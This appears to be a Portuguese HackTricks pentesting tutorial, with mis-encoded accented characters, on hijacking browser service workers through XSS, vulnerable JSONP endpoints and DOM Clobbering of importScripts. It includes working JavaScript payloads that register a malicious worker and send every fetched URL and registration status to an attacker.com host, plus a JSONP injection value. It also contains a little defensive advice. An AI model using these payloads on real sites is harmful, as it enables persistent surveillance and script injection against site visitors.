# Abusando dos Service Workers



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que s√£o mais importantes para que voc√™ possa corrigi-las mais rapidamente. O Intruder rastreia sua superf√≠cie de ataque, executa varreduras proativas de amea√ßas, encontra problemas em toda a sua pilha de tecnologia, desde APIs at√© aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Informa√ß√µes B√°sicas

Um service worker √© um **script** que seu navegador **executa** em **segundo plano**, separado de uma p√°gina da web, abrindo a porta para recursos que n√£o precisam de uma p√°gina da web ou intera√ß√£o do usu√°rio. ([Mais informa√ß√µes sobre o que √© um service worker aqui](https://developers.google.com/web/fundamentals/primers/service-workers)).\
Ent√£o, voc√™ pode abusar dos service workers **criando/modificando-os** na **sess√£o da v√≠tima** dentro do **dom√≠nio** web **vulner√°vel** que concede ao **atacante o controle** sobre **todas as p√°ginas** que a **v√≠tima** carregar√° nesse dom√≠nio.

### Verificar SWs existentes

Voc√™ pode v√™-los no campo **Service Workers** na guia **Application** das **Ferramentas de Desenvolvedor**. Voc√™ tamb√©m pode olhar em [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals).

### Notifica√ß√µes Push

Se a v√≠tima n√£o concedeu permiss√µes de **notifica√ß√µes push**, o service worker **n√£o poder√° receber comunica√ß√µes do servidor se o usu√°rio n√£o acessar a p√°gina do atacante novamente**. Isso ir√° **prevenir**, por exemplo, a manuten√ß√£o de conversas com todas as p√°ginas que acessaram a p√°gina da web do atacante, para que, se um exploit for encontrado, o SW possa receb√™-lo e execut√°-lo.\
No entanto, se a v√≠tima **conceder permiss√µes de notifica√ß√µes push, isso pode representar um risco**.

## Ataque Criando um Service Worker

Para explorar essa vulnerabilidade, voc√™ precisa encontrar:

* Uma maneira de **fazer upload de arquivos JS arbitr√°rios** para o servidor e um **XSS para carregar o service worker** do arquivo JS enviado
* Uma **solicita√ß√£o JSONP vulner√°vel** onde voc√™ pode **manipular a sa√≠da (com c√≥digo JS arbitr√°rio)** e um **XSS** para **carregar o JSONP com um payload** que ir√° **carregar um service worker malicioso**.

No exemplo a seguir, vou apresentar um c√≥digo para **registrar um novo service worker** que ir√° ouvir o evento `fetch` e **enviar para o servidor do atacante cada URL buscado** (este √© o c√≥digo que voc√™ precisaria **fazer upload** para o **servidor** ou carregar via uma resposta **JSONP vulner√°vel**):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
E este √© o c√≥digo que ir√° **registrar o worker** (o c√≥digo que voc√™ deve ser capaz de executar abusando de um **XSS**). Neste caso, uma solicita√ß√£o **GET** ser√° enviada para o servidor do **atacante**, **notificando** se o **registro** do service worker foi bem-sucedido ou n√£o:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
No caso de abusar de um ponto de extremidade JSONP vulner√°vel, voc√™ deve colocar o valor dentro de `var sw`. Por exemplo:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Existe um **C2** dedicado √† **explora√ß√£o de Service Workers** chamado [**Shadow Workers**](https://shadow-workers.github.io) que ser√° muito √∫til para abusar dessas vulnerabilidades.

Em uma situa√ß√£o de XSS, o limite de diretiva de cache de 24 horas garante que um SW malicioso ou comprometido sobreviva a uma corre√ß√£o da vulnerabilidade de XSS por no m√°ximo 24 horas (assumindo que o cliente esteja online). Os operadores do site podem reduzir a janela de vulnerabilidade definindo TTLs mais baixos nos scripts SW. Tamb√©m incentivamos os desenvolvedores a [criarem um SW de desativa√ß√£o](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776).

## Abusando do `importScripts` em um SW atrav√©s do DOM Clobbering

A fun√ß√£o **`importScripts`** chamada de um Service Worker pode **importar um script de um dom√≠nio diferente**. Se essa fun√ß√£o for chamada usando um **par√¢metro que um atacante poderia** modificar, ele seria capaz de **importar um script JS de seu dom√≠nio** e obter XSS.

**Isso at√© mesmo contorna as prote√ß√µes CSP.**

**Exemplo de c√≥digo vulner√°vel:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Com DOM Clobbering

Para obter mais informa√ß√µes sobre o que √© o DOM Clobbering, consulte:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Se a URL/dom√≠nio que o SW est√° usando para chamar **`importScripts`** estiver **dentro de um elemento HTML**, √© **poss√≠vel modific√°-lo via DOM Clobbering** para fazer com que o SW **carregue um script do seu pr√≥prio dom√≠nio**.

Para um exemplo disso, consulte o link de refer√™ncia.

## Refer√™ncias

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que s√£o mais importantes para que voc√™ possa corrigi-las mais rapidamente. O Intruder rastreia sua superf√≠cie de ataque, executa varreduras proativas de amea√ßas, encontra problemas em toda a sua pilha de tecnologia, desde APIs at√© aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? Ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
